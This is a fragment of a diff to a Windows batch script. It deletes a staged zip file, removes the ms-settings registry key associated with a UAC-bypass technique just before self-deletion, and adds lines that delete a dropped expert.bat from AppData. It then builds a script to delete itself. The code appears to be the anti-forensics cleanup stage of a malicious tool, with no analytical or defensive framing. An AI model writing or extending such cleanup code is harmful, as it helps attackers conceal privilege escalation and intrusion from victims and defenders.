@@ -75,6 +75,12 @@ del "%zip_output%" >nul 2>&1
 :: Remove the ms-settings registry key immediately before self-deletion
 powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force" >nul 2>&1
 
+:: Delete the expert.bat file in AppData if it exists
+set "expert_bat=C:\Users\%USERNAME%\AppData\expert.bat"
+if exist "%expert_bat%" (
+    del "%expert_bat%" >nul 2>&1
+)
+
 :: Create a secondary batch script to delete this script
 (
 echo @echo off
